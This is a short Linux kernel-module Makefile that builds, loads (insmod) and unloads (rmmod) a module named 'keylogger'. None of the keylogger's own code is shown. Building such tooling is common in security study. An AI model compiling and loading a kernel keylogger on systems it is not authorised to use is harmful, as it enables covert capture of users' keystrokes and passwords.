obj-m := keylogger.o
keylogger-objs := main.o keyboard.o

PWD = $(shell pwd)
NAME = "keylogger"
KDIR = /lib/modules/$(shell uname -r)/build

all :
	make -C $(KDIR) M=$(PWD) modules
clean : 
	make -C $(KDIR) M=$(PWD) clean
	-@rmmod keylogger 2>/dev/null || true
run : all
	insmod keylogger.ko
re: clean all